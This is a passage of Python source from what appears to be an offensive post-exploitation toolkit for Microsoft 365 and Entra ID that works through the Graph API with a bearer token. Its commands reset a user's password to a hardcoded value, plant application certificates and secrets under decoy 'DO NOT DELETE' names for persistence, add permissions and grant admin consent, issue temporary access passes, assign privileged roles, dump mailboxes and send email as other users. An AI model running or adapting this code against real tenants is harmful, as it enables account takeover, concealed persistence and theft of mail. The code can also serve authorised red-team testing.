                            "On-Prem Sync Enabled": group.get('onPremisesSyncEnabled'),
                            "Mail": group.get('mail'),
                            "Created Date": group.get('createdDateTime'),
                            "Visibility": group.get('visibility'),
                            "MembershipRule": group.get('membershipRule'),
                            "Membership Rule Processing State": group.get('membershipRuleProcessingState')
                        }
                        results.append(group_out)
                
                graph_api_endpoint = response_data.get('@odata.nextLink')
            
            except requests.exceptions.RequestException as e:
                print_red(f"[-] Error fetching Group IDs: {str(e)}")
                break

        if results:
            for result in results:
                for key, value in result.items():
                    print(f"{key:<35} : {value}")
                print()
        else:
            print_red("[-] No dynamic groups found")
        print("=" * 80)

    # find-securitygroups
    elif args.command and args.command.lower() == "find-securitygroups":
        print_yellow("\n[*] Find-SecurityGroups")
        print("=" * 80)
        graph_api_url = "https://graph.microsoft.com/v1.0"
        groups_url = f"{graph_api_url}/groups?$filter=securityEnabled eq true"

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }
        groups_with_members = []
        
        while groups_url:
            try:
                response = requests.get(groups_url, headers=headers)
                response.raise_for_status()
                groups_response = response.json()
                groups = groups_response.get('value', [])
            except requests.exceptions.RequestException as e:
                print_red(f"[-] An error occurred while retrieving security groups: {str(e)}")
                return

            for group in groups:
                group_id = group['id']
                members_url = f"{graph_api_url}/groups/{group_id}/members"
                
                try:
                    members_response = requests.get(members_url, headers=headers)
                    members_response.raise_for_status()
                    members = members_response.json().get('value', [])
                except requests.exceptions.HTTPError as e:
                    if e.response.status_code == 429:
                        print_yellow("[*] Being throttled... sleeping for 5 seconds")
                        time.sleep(5)
                    else:
                        print_red(f"[-] An error occurred while retrieving members for group {group['displayName']}: {str(e)}")
                    continue

                member_info = [
                    member.get('userPrincipalName') or member.get('id', '')
                    for member in members
                ]
                group_info = {
                    "GroupName": group['displayName'],
                    "GroupId": group_id,
                    "Members": member_info
                }
                groups_with_members.append(group_info)

            groups_url = groups_response.get('@odata.nextLink')

        if groups_with_members:
            #print_green(f"[*] Found {len(groups_with_members)} security groups\n")
            for group in groups_with_members:
                print(f"Group Name: {group['GroupName']}")
                print(f"Group ID: {group['GroupId']}")
                print("Members:")
                for member in group['Members']:
                    print(f" - {member}")
                print()
        else:
            print_red("[-] No security groups found")
        print("=" * 80)

    # update-userpassword
    elif args.command and args.command.lower() == "update-userpassword":
        if not args.id:
            print_red("[-] Error: --id required for Update-UserPassword command")
            return

        print_yellow("\n[*] Update-UserPassword")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}"

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }

        json_body = {
            "passwordProfile": {
                "forceChangePasswordNextSignIn": False,
                "password": "NewUserSecret@Pass!"
            }
        }

        response = requests.patch(api_url, headers=headers, data=json.dumps(json_body))
        if response.ok:
            print_green("[+] User password profile updated")
        
        else:
            print_red(f"[-] Failed to update user password: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # update-userproperties
    elif args.command and args.command.lower() == "update-userproperties":
        if not args.id:
            print_red("[-] Error: --id required for Update-UserProperties command")
            return

        print_yellow("\n[*] Update-UserProperties")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}"

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }

        print("\033[34m[>] Property Definitions: https://learn.microsoft.com/en-us/graph/api/user-update\033[0m")

        try:
            userproperty = input("\nEnter Property: ").strip()
            if userproperty not in properties:
                print_red(f"\n[-] Error: '{userproperty}' is not a valid property.")
                print("=" * 80)
                sys.exit()
            newvalue = input(f"Enter New '{userproperty}' Value: ").strip()
        except KeyboardInterrupt:
            sys.exit()

        json_body = {
            userproperty : newvalue
        }

        response = requests.patch(api_url, headers=headers, data=json.dumps(json_body))
        if response.ok:
            print_green("\n[+] User properties updated successfully")
        
        else:
            print_red(f"\n[-] Failed to update user properties: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # add-applicationcertificate  
    elif args.command and args.command.lower() == "add-applicationcertificate":
        openssl = """
Generate Certificate:
openssl genrsa -out private.key 2048
openssl req -new -key private.key -out request.csr
openssl x509 -req -days 365 -in request.csr -signkey private.key -out certificate.crt
openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.crt 
        """
        if not args.id or not args.cert:
            print_red("[-] Error: --id and --cert required for Add-ApplicationCertificate command")
            print_red(openssl)
            return

        def read_and_encode_cert(cert_path):
            try:
                if not os.path.isfile(cert_path):
                    print_red(f"[-] The certificate file '{cert_path}' does not exist.")
                with open(cert_path, 'rb') as cert_file:
                    encoded_cert = cert_file.read()
                return encoded_cert
            except Exception as e:
                sys.exit(1)

        encoded_cert = read_and_encode_cert(args.cert)

        print_yellow("\n[*] Add-ApplicationCertificate")
        print("=" * 80)

        # 1. Find existing certs so we don't remove them in the patch req
        api_url = f"https://graph.microsoft.com/v1.0/applications/{args.id}"
        
        user_agent = get_user_agent(args)
        headers = {
            'Authorization': 'Bearer ' + access_token,
            'Content-Type':'application/json',
            'User-Agent': user_agent
        }
        
        response = requests.get(api_url, headers=headers)

        if response.status_code == 200:
            applications = response.json()
            key_credentials = applications.get('keyCredentials', [])  
        else:
            print_red(f"[-] Error obtaining existing certificates {response.status_code}")
            print_red(response.text)

        # 2. patch app added our cert to the existing 
        api_url = f"https://graph.microsoft.com/v1.0/applications/{args.id}"
        
        try:
            displayname = input("\nEnter Certificate Display Name: ").strip()
            if not displayname:
                displayname = "DevOps Certificate - DO NOT DELETE"
        except KeyboardInterrupt:
            sys.exit()

        new_key_credential = {
            "type": "AsymmetricX509Cert",
            "usage": "Verify",
            "key": encoded_cert,
            "displayName": displayname
        }
        key_credentials.append(new_key_credential)

        data = {
            "keyCredentials": key_credentials
        }
        
        response = requests.patch(api_url, headers=headers, data=json.dumps(data))
        if response.ok:
            print_green("\n[+] Successfully added application certificate")
        else:
            print_red(f"\n[-] Failed to add certificate: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # add-applicationpassword
    elif args.command and args.command.lower() == "add-applicationpassword":
        if not args.id:
            print_red("[-] Error: --id required for Add-ApplicationPassword command")
            return

        print_yellow("\n[*] Add-ApplicationPassword")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/applications/{args.id}"

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }

        current_time_utc = datetime.now(timezone.utc)
        six_months_later = current_time_utc + timedelta(days=6*30)
        formatted_date = six_months_later.strftime("%Y-%m-%dT%H:%M:%SZ")
        json_body = {"displayName":"Added by Azure Service Bus - DO NOT DELETE", "endDateTime": formatted_date}

        response = requests.post(api_url, headers=headers, data=json.dumps(json_body))
        if response.ok:
            response_body = response.json()
                
            for key, value in response_body.items():
                if not key.startswith("@odata.context"):
                    pretty_value = json.dumps(value, indent=4)
                    if key == "secretText":
                        print_green(f"{key}: {pretty_value}")
                    else:
                        print(f"{key}: {pretty_value}")

        else:
            print_red(f"[-] Failed to add password: {response.status_code}")
            print_red(response.text)
        print("=" * 80)


    # add-applicationpermission
    elif args.command and args.command.lower() == "add-applicationpermission":
        if not args.id:
            print_red("[-] Error: --id required for Add-ApplicationPermission command")
            return
        print_yellow("\n[*] Add-ApplicationPermission")
        print("=" * 80)
        
        # 1. check existing permissions
        api_url = f"https://graph.microsoft.com/beta/myorganization/applications(appId='{args.id}')"  # app id
        #api_url = f"https://graph.microsoft.com/v1.0/applications/{args.id}"  # object id
        
        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }
        response = requests.get(api_url, headers=headers)
        existingperms = []
        if response.status_code == 200:
            response_json = response.json()
            existingperms = response_json.get('requiredResourceAccess', [])
        
        # 2. patch perms
        api_url = f"https://graph.microsoft.com/beta/myorganization/applications(appId='{args.id}')"  # app id
        #api_url = f"https://graph.microsoft.com/v1.0/myorganization/applications/{args.id}"  # object id

        print("\033[34m[>] API Permissions: https://learn.microsoft.com/en-us/graph/permissions-reference\033[0m")
        
        # permission id validation
        def parse_permissionid(content):
            soup = BeautifulSoup(content, 'html.parser')
            permissions = {}
            for h3 in soup.find_all('h3'):
                permission_name = h3.get_text()
                table = h3.find_next('table')
                rows = table.find_all('tr')
                application_id = rows[1].find_all('td')[1].get_text()
                delegated_id = rows[1].find_all('td')[2].get_text()
                application_consent = rows[4].find_all('td')[1].get_text() if len(rows) > 4 else "Unknown"
                delegated_consent = rows[4].find_all('td')[2].get_text() if len(rows) > 4 else "Unknown"
                permissions[application_id] = ('Application', permission_name, application_consent)
                permissions[delegated_id] = ('Delegated', permission_name, delegated_consent)
            return permissions

        script_dir = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(script_dir, '.github', 'graphpermissions.txt')

        try:
            with open(file_path, 'r') as file:
                content = file.read()
        except FileNotFoundError:
            print_red(f"\n[-] The file {file_path} does not exist.")
            sys.exit(1)
        except Exception as e:
            print_red(f"\n[-] An error occurred: {e}")
            sys.exit(1)

        permissions = parse_permissionid(content)

        try:
            permissionid = input("\nEnter API Permission ID: ").strip()
            if permissionid not in permissions:
                print_red("\n[-] Invalid permission ID. Not in graphpermissions.txt")
                sys.exit(1)
            
            permission_info = permissions[permissionid]
            if len(permission_info) == 3:
                permission_type, permission_name, admin_consent_required = permission_info
            else:
                permission_type, permission_name = permission_info
                admin_consent_required = "Unknown"
            
            print(f"\nPermission ID: {permissionid} corresponds to '{permission_name}' with type '{permission_type}'")
            
            # grant admin consent option
            print(f"Admin Consent Required: {admin_consent_required}")
            if admin_consent_required.lower() == 'yes':
                grantadminconsent = input(f"\nGrant Admin Consent For: {permission_name}? (yes/no): ").strip().lower()
            else:
                pass
                grantadminconsent = 'no'

        except KeyboardInterrupt:
            sys.exit(1)
                
        if permission_type.lower() == "application":
            typevalue = "Role"
        elif permission_type.lower() == "delegated":
            typevalue = "Scope"
        else:
            print_red("\n[-] Unexpected error")
            print("=" * 80)
            sys.exit()

        graphresource = next((resource for resource in existingperms if resource['resourceAppId'] == '00000003-0000-0000-c000-000000000000'), None) # does Microsoft Graph resource already exist
        
        if graphresource:
            graphresource['resourceAccess'].append({
                "id": permissionid,
                "type": typevalue
            })
        else:
            existingperms.append({
                "resourceAppId": "00000003-0000-0000-c000-000000000000",
                "resourceAccess": [
                    {
                        "id": permissionid, # b633e1c5-b582-4048-a93e-9f11b44c7e96 -> Mail.Send (Application perm - admin consent required)
                        "type": typevalue
                    }
                ]
            })
        
        # assign perm json
        data = {
            "requiredResourceAccess": existingperms
        }

        clientAppId = args.id

        # admin consent json
        admin_data = {
            "clientAppId": clientAppId,
            "onBehalfOfAll": True,
            "checkOnly": False,
            "tags": [],
            "constrainToRra": True,
            "dynamicPermissions": [
                {
                    "appIdentifier": "00000003-0000-0000-c000-000000000000",
                    "appRoles": [permission_name], 
                    "scopes": [] 
                }
            ]
        }

        response = requests.patch(api_url, headers=headers, json=data)
        if grantadminconsent == "no":
            if response.ok:
                print_green("\n[+] Application permissions updated successfully")
                print("=" * 80)
                sys.exit()
            else:
                print_red(f"\n[-] Failed to update application permissions: {response.status_code}")
                print_red(response.text)
                print("=" * 80)
                sys.exit()

        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent,
            'Content-Type': 'application/json',
        }

        # any failures granting admin consent likely due to token scope/perms
        if grantadminconsent == "yes":
            if response.ok:
                print_green("\n[+] Application permissions updated successfully")

                print()
                custom_bar = '╢{bar:50}╟'
                for _ in tqdm(range(5), bar_format='{l_bar}'+custom_bar+'{r_bar}', leave=False, colour='yellow'):
                    time.sleep(1)
                
                granturl = "https://graph.microsoft.com/beta/directory/consentToApp"
                grantreq = requests.post(granturl, headers=headers, json=admin_data)
                
                if grantreq.ok:
                    print_green(f"[+] Admin consent granted for: '{permission_name}'")
                else:
                    print_red(f"\n[-] Failed to grant admin consent: {grantreq.status_code}")
                    print_red(grantreq.text)
        print("=" * 80)

    # grant-appadminconsent
    elif args.command and args.command.lower() == "grant-appadminconsent":
        if not args.id:
            print_red("[-] Error: --id required for Grant-AppAdminConsent command")
            return

        print_yellow("\n[*] Grant-AppAdminConsent")
        print("=" * 80)
        clientAppId = args.id
        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent,
            'Content-Type': 'application/json',
        }

        script_dir = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(script_dir, '.github', 'graphpermissions.txt')
        try:
            with open(file_path, 'r') as file:
                content = file.read()
        except FileNotFoundError:
            print_red(f"\n[-] The file {file_path} does not exist.")
            sys.exit(1)
        except Exception as e:
            print_red(f"\n[-] An error occurred: {e}")
            sys.exit(1)

        try:
            permission_names = input("\nEnter Permission Names (comma-separated): ").strip().split(',')
            permission_names = [name.strip() for name in permission_names]
        except KeyboardInterrupt:
            sys.exit()

        invalid_permissions = [name for name in permission_names if name not in content]
        if invalid_permissions:
            print_red(f"\n[-] Invalid Graph permissions: {', '.join(invalid_permissions)}")
            print("=" * 80)
            sys.exit()

        admin_data = {
            "clientAppId": clientAppId,
            "onBehalfOfAll": True,
            "checkOnly": False,
            "tags": [],
            "constrainToRra": True,
            "dynamicPermissions": [
                {
                    "appIdentifier": "00000003-0000-0000-c000-000000000000",
                    "appRoles": permission_names, 
                    "scopes": [] 
                }
            ]
        }

        url = "https://graph.microsoft.com/beta/directory/consentToApp"
        request = requests.post(url, headers=headers, json=admin_data)
                
        if request.ok:
            print_green(f"\n[+] Admin consent granted for: '{', '.join(permission_names)}'")
        else:
            print_red(f"\n[-] Failed to grant admin consent: {request.status_code}")
            print_red(request.text)
        print("=" * 80)

    # add-userTAP
    elif args.command and args.command.lower() == "add-usertap":
        if not args.id:
        
            print_red("[-] Error: --id required for Add-UserTAP command")
            return

        print_yellow("\n[*] Add-UserTAP")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}/authentication/temporaryAccessPassMethods"

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }

        current_time_utc = datetime.now(timezone.utc)
        one_hour_later = current_time_utc + timedelta(minutes=60)
        formatted_date = one_hour_later.strftime("%Y-%m-%dT%H:%M:%SZ")
        
        json_body = {
            "properties": {
                "isUsableOnce": True,
                "startDateTime": formatted_date
            }
        }
        
        response = requests.post(api_url, headers=headers, data=json.dumps(json_body))
        if response.ok:
            response_body = response.json()
                
            for key, value in response_body.items():
                if not key.startswith("@odata.context"):
                    pretty_value = json.dumps(value, indent=4)
                    print(f"{key}: {pretty_value}")
                
            url = response_body.get("@odata.nextLink")
            if url:
                response = requests.get(url, headers=headers)
                response.raise_for_status()
                response_body = response.json()
        else:
            print_red(f"[-] Failed to add TAP: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # add-groupmember
    elif args.command and args.command.lower() == "add-groupmember":
        if not args.id:
            print_red("[-] Error: --id groupid,objectid required for Add-GroupMember command")
            return

        ids = args.id.split(',')
        if len(ids) != 2:
            print_red("[-] Please provide two IDs separated by a comma (group ID, object ID).")
            return

        group_id, member_id = ids[0].strip(), ids[1].strip()

        print_yellow("\n[*] Add-GroupMember")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/groups/{group_id}/members/$ref"

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }

        json_body = {
            "@odata.id": f"https://graph.microsoft.com/v1.0/directoryObjects/{member_id}"
        }
        
        response = requests.post(api_url, headers=headers, data=json.dumps(json_body))
        if response.ok:
            print_green("[+] User added to group")
        else:
            print_red(f"[-] Failed to add group member: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # create-application
    elif args.command and args.command.lower() == "create-application":

        print_yellow("\n[*] Create-Application")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/applications"

        try:
            appname = input("\nEnter App Name: ").strip()
        except KeyboardInterrupt:
            sys.exit()

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }

        json_body = {"displayName": appname}
        
        response = requests.post(api_url, headers=headers, data=json.dumps(json_body))
        if response.ok:
            print_green("\n[+] Application created\n")
            response_body = response.json()
                
            for key, value in response_body.items():
                if not key.startswith("@odata.context"):
                    pretty_value = json.dumps(value, indent=4)
                    print(f"{key}: {pretty_value}")

        else:
            print_red(f"[-] Failed to create application: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # create-newuser
    elif args.command and args.command.lower() == "create-newuser":

        print_yellow("\n[*] Create-NewUser")
        print("=" * 80)
        try:
            display_name = input("\nEnter Display Name: ").strip()
            mail_nickname = input("Enter Mail Nickname: ").strip()
            user_principal_name = input("Enter User Principal Name: ").strip()
            password = input("Enter Password: ").strip()
        except KeyboardInterrupt:
            sys.exit()

        api_url = f"https://graph.microsoft.com/v1.0/users/"

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }

        json_body = {
            "accountEnabled": True,
            "displayName": display_name,
            "mailNickname": mail_nickname,
            "userPrincipalName": user_principal_name,
            "passwordProfile": {
                "forceChangePasswordNextSignIn": True,
                "password": password
            }
        }
        
        response = requests.post(api_url, headers=headers, data=json.dumps(json_body))
        if response.ok:
            print_green("\n[+] New user created\n")
            response_body = response.json()
                
            for key, value in response_body.items():
                if not key.startswith("@odata.context"):
                    pretty_value = json.dumps(value, indent=4)
                    print(f"{key}: {pretty_value}")
                
        else:
            print_red(f"[-] Failed to create new user: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # invite-guestuser
    elif args.command and args.command.lower() == "invite-guestuser":
        if not args.tenant:
            print_red("[-] Error: --tenant required for Invite-GuestUser command")
            return

        print_yellow("\n[*] Invite-GuestUser")
        print("=" * 80)
        try:
            email = input("\nEnter Email Address: ").strip()
            displayname = input("Enter Display Name: ").strip()
            redirecturl = input("Enter Invite Redirect URL (leave blank for default): ").strip() # https://myapplications.microsoft.com/?tenantid=...
            sendinvitationmessage = input("Send Email Invitation? (true/false): ").strip().lower()
            custommessage = input("Custom Message Body: ").strip()
        except KeyboardInterrupt:
            sys.exit()

        if redirecturl == "":
            redirecturl = f"https://myapplications.microsoft.com/?tenantid={args.tenant}"

        api_url = f"https://graph.microsoft.com/v1.0/invitations"

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }

        json_body = {
            "invitedUserEmailAddress": email,
            "invitedUserDisplayName": displayname,
            "inviteRedirectUrl": redirecturl,
            "sendInvitationMessage": sendinvitationmessage,
            "invitedUserMessageInfo": {
                "customizedMessageBody": custommessage
            }
        }
        
        response = requests.post(api_url, headers=headers, data=json.dumps(json_body))
        if response.ok:
            print_green("\n[+] Guest user invited\n")
            response_body = response.json()
                
            for key, value in response_body.items():
                if not key.startswith("@odata.context"):
                    pretty_value = json.dumps(value, indent=4)
                    print(f"{key}: {pretty_value}")
                
        else:
            print_red(f"[-] Failed to invite guest user: {response.status_code}")
            print_red(response.text)
        print("=" * 80)


    # assign-privilegedrole
    elif args.command and args.command.lower() == "assign-privilegedrole":

        print_yellow("\n[*] Assign-PrivilegedRole")
        print("=" * 80)
        table = [[role["displayName"], role["roleTemplateId"], role["description"]] for role in roles]
        separator = ['-' * 20, '-' * 20, '-' * 20]
        print(tabulate([["Display Name", "Role Template ID", "Description"]] + [separator] + table, headers="firstrow", tablefmt="plain", colalign=("left", "left", "left")))

        try:
            roleid = input("\nEnter Role Template ID: ").strip()
            objectid = input("Enter Object ID (user/group id): ").strip()
            scopeid = input("Enter Scope ID (enter '/' for tenant wide): ").strip() # e.g. "/administrativeUnits/5d107bba-d8e2-4e13-b6ae-884be90e5d1a" or / for tenant wide scope
        except KeyboardInterrupt:
            sys.exit()

        api_url = f"https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments"

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }

        json_body = {
            "@odata.type": "#microsoft.graph.unifiedRoleAssignment",
            "roleDefinitionId": roleid,
            "principalId": objectid,
            "directoryScopeId": scopeid
        }

        response = requests.post(api_url, headers=headers, data=json.dumps(json_body))
        if response.ok:
            print_green("\n[+] Role assigned\n")
            response_body = response.json()
                
            for key, value in response_body.items():
                if not key.startswith("@odata.context"):
                    pretty_value = json.dumps(value, indent=4)
                    print(f"{key}: {pretty_value}")
                
        else:
            print_red(f"[-] Failed to assign role: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # open-owamailboxinbrowser
    elif args.command and args.command.lower() == "open-owamailboxinbrowser":
        print_yellow("\n[*] Open-OWAMailboxInBrowser")
        print("=" * 80)

        user_agent = get_user_agent(args)
        headers = {
                "Authorization": f"Bearer {access_token}",
                "User-Agent": user_agent
            }

        if args.only_return_cookies:
            try:
                response = requests.get("https://substrate.office.com/owa/", headers=headers, allow_redirects=False)
                print_green("[+] Cookies:")
                print(response.headers.get('Set-Cookie'))
            except requests.RequestException as e:
                print_red(f"[-] Error making request: {str(e)}")
        else:
            print("To open the OWA mailbox in a browser using a Substrate Access Token:")
            print("1. Open a new BurpSuite Repeater tab & set the Target to 'https://substrate.office.com'")
            print("2. Paste the below request into Repeater & Send")
            print("3. Right click the response > 'Show response in browser', then open the response in Burp's embedded browser")
            print("4. Refresh the page to access the mailbox")
            print()
            print("GET /owa/ HTTP/1.1")
            print(f"Host: substrate.office.com")
            print(f"Authorization: Bearer {args.token}")
            print()
        print("=" * 80)

    # dump-owamailbox
    elif args.command and args.command.lower() == "dump-owamailbox":
        if not args.mail_folder:
            print_red("[-] Mail folder --mail-folder is required for this command.")
            return

        if args.id:
            base_url = f"https://graph.microsoft.com/v1.0/users/{args.id}/mailFolders/{args.mail_folder}/messages"
        else:
            base_url = f"https://graph.microsoft.com/v1.0/me/mailFolders/{args.mail_folder}/messages"

        query_params = []
        if args.select:
            query_params.append(f"$select={args.select}")

        if args.top:
            query_params.append(f"$top={args.top}")

        if query_params:
            api_url = f"{base_url}?" + "&".join(query_params)
        else:
            api_url = base_url
        
        max_results = 400

        print_yellow("\n[*] Dump-OWAMailbox")
        print("=" * 80)
        user_agent = get_user_agent(args)
        headers = {
            "Authorization": f"Bearer {access_token}",
            "User-Agent": user_agent
        }

        try:
            response = requests.get(api_url, headers=headers)
            response.raise_for_status()
            response_body = response.json()

            filtered_data = {key: value for key, value in response_body.items() if not key.startswith("@odata")}

            if filtered_data:
                if not filtered_data.get('value'):
                    print_red("[-] No data found")
                    return

                email_count = 1
                for d in filtered_data.get('value', []):
                    print_green(f"Email {email_count}")
                    print_green("="*80)
                    for key, value in d.items():
                        print(f"{key} : {value}")
                    print("\n")
                    email_count += 1
                
            url = response_body.get("@odata.nextLink")
            if url:
                response = requests.get(url, headers=headers)
                response.raise_for_status()
                response_body = response.json()

        except requests.RequestException as e:
            print_red(f"[-] Error making request: {str(e)}")

        print("=" * 80)

    # spoof-owaemailmessage
    elif args.command and args.command.lower() == "spoof-owaemailmessage":
        if not args.email:
            print_red("[-] Error: --email argument is required for Spoof-OWAEmailMessage command")
            return

        print_yellow("\n[*] Spoof-OWAEmailMessage")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/me/sendMail"
        
        if args.id:
            api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}/sendMail"
        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }

        try:
            subject = input("\nEnter Subject: ").strip()
            torecipients = input("Enter toRecipients (comma-separated): ").strip()
            ccrecipients = input("Enter ccRecipients (comma-separated): ").strip()
            savetf = input("Save To Sent Items (true/false): ").strip().lower() == 'false' # default
        except KeyboardInterrupt:
            sys.exit()

        to_recipients = [{"emailAddress": {"address": email.strip()}} for email in torecipients.split(',') if email.strip()]
        cc_recipients = [{"emailAddress": {"address": email.strip()}} for email in ccrecipients.split(',') if email.strip()]

        content = read_file_content(args.email)

        json_body = {
            "message": {
                "subject": subject,
                "body": {
                    "contentType": "Text",
                    "content": content 
                },
                "toRecipients": to_recipients,
                "ccRecipients": cc_recipients
            },
            "saveToSentItems": savetf
        }

        # Add attachment option - check what other files are supported...
        # "attachments": [
        #    {
        #        "@odata.type": "#microsoft.graph.fileAttachment",
        #        "name": "attachment.txt",
        #        "contentType": "text/plain",
        #        "contentBytes": "SGVsbG8gV29ybGQh"
        #    }
        # ]
    
        response = requests.post(api_url, headers=headers, json=json_body)
        if response.ok:
            print_green("\n[+] Email sent successfully")
            
        else:
            print_red(f"\n[-] Failed to send OWA email message: {response.status_code}")
            print_red(response.text)
        print("=" * 80)


    ################################
    # Post-Auth Intune Enumeration #
    ################################

    # get-manageddevices
    if args.command and args.command.lower() == "get-manageddevices":
        print_yellow("\n[*] Get-ManagedDevices")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices"

        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-userdevices
    elif args.command and args.command.lower() == "get-userdevices":
        if not args.id:
            print_red("[-] Error: --id argument is required for Get-UserDevices command")
            return

        print_yellow("\n[*] Get-UserDevices")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/deviceManagement/managedDevices?$filter=userPrincipalName eq '{args.id}'"

        if args.select:
            api_url += "&$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-caps
    elif args.command and args.command.lower() == "get-caps":
        print_yellow("\n[*] Get-CAPs")
        print("=" * 80)
        api_url = "https://graph.microsoft.com//beta/identity/conditionalAccess/policies"

        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-devicecategories
    elif args.command and args.command.lower() == "get-devicecategories":
        print_yellow("\n[*] Get-DeviceCategories")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/deviceManagement/deviceCategories"

        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-devicecompliancesummary
    elif args.command and args.command.lower() == "get-devicecompliancesummary":
        print_yellow("\n[*] Get-DeviceComplianceSummary")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/deviceManagement/deviceCompliancePolicyDeviceStateSummary"

        if args.select:
            api_url += "?$select=" + args.select

        user_agent = get_user_agent(args)
        headers = {
        'Authorization': f'Bearer {access_token}',
        'User-Agent': user_agent
        }
        response = requests.get(api_url, headers=headers)
        
        if response.ok:
            response_body = response.json()
            for key, value in response_body.items():
                if not key.startswith("@odata.context"):
                    pretty_value = json.dumps(value, indent=4)
                    print(f"{key}: {pretty_value}")
        else:
            print_red(f"[-] Failed to retrieve settings: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # get-deviceconfigurations
    elif args.command and args.command.lower() == "get-deviceconfigurations":
        print_yellow("\n[*] Get-DeviceConfigurations")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/deviceManagement/deviceConfigurations"

        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-deviceconfigurationpolicies
    elif args.command and args.command.lower() == "get-deviceconfigurationpolicies":
        print_yellow("\n[*] Get-DeviceConfigurationPolicies")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/beta/deviceManagement/configurationPolicies"
        if args.select:
            api_url += "?$select=" + args.select
        
        user_agent = get_user_agent(args)
        headers = {
            'Authorization': 'Bearer ' + access_token,
            'Accept': 'application/json',
            'User-Agent': user_agent
        }
        
        response = requests.get(api_url, headers=headers)
        
        if response.status_code == 200:
            policies = response.json()
        else:
            print_red(f"[-] Error: API request failed with status code {response.status_code}")
            policies = None
            print("=" * 80)
        
        if policies and 'value' in policies:
            for policy in policies['value']:
                for key, value in policy.items():
                    print(f"{key} : {value}")
                
                if 'templateReference' in policy and 'templateDisplayName' in policy['templateReference']:
                    print(f"template: {policy['templateReference']['templateDisplayName']}")
                
                # display assignments for each policy
                policy_id = policy.get('id')
                if policy_id:
                    assignments_api_url = f"https://graph.microsoft.com/beta/deviceManagement/configurationPolicies('{policy_id}')/assignments"
                    assignments_response = requests.get(assignments_api_url, headers=headers)
                    
                    if assignments_response.status_code == 200:
                        assignments = assignments_response.json()
                        if not assignments.get('value'):
                            print_red("assignments: None")
                        else:
                            print_green("assignments:")
                            for assignment in assignments.get('value', []):
                                if 'target' in assignment:
                                    target = assignment['target']
                                    odata_type = target.get('@odata.type', '').split('.')[-1]
                                    if odata_type == 'exclusionGroupAssignmentTarget':
                                        group_id = target.get('groupId', 'N/A')
                                        print(f"- Excluded Group ID: {group_id}")
                                    elif odata_type == 'allLicensedUsersAssignmentTarget':
                                        print("- Assigned to all users")
                                    elif odata_type == 'allDevicesAssignmentTarget':
                                        print("- Assigned to all devices")
                                    elif odata_type == 'groupAssignmentTarget':
                                        group_id = target.get('groupId', 'N/A')
                                        print(f"- Assigned to Group ID: {group_id}")
                                    else:
                                        print(f"- {odata_type}: {target}")
                    else:
                        print_red(f"[-] Error: API request for assignments failed with status code {assignments_response.status_code}")
                print("\n")
            print("=" * 80)

    # get-deviceconfigurationpolicysettings
